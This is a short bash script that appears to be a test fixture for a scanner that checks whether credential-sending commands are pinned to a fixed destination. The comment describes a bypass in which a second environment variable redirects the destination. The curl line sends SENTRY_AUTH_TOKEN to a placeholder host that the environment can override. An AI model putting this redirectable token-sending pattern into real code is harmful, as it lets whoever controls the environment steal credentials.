#!/usr/bin/env bash
set -uo pipefail

case "$-" in
  *x*)
    if [ -n "${SENTRY_AUTH_TOKEN:+x}" ]; then
      printf "[FATAL] refusing to trace with SENTRY_AUTH_TOKEN set (#7797)\n" >&2
      exit 78
    fi
    ;;
esac

# Rule D: the destination is compared against ANOTHER ENV-SETTABLE VARIABLE, so
# a second env var redirects the credential with the "pin" fully intact. The
# RHS class used to include `$`, which made this count as adjudicated -- the
# case _pin_re's own docstring claimed to have closed while accepting it.
SINK_URL="${FIXTURE_SINK_URL:-https://example.invalid/}"
if [ "$SINK_URL" != "${FIXTURE_EXPECTED_URL:-https://example.invalid/}" ]; then
  exit 2
fi
curl --disable --noproxy '*' -sS -H "Authorization: Bearer ${SENTRY_AUTH_TOKEN}" "$SINK_URL" || true
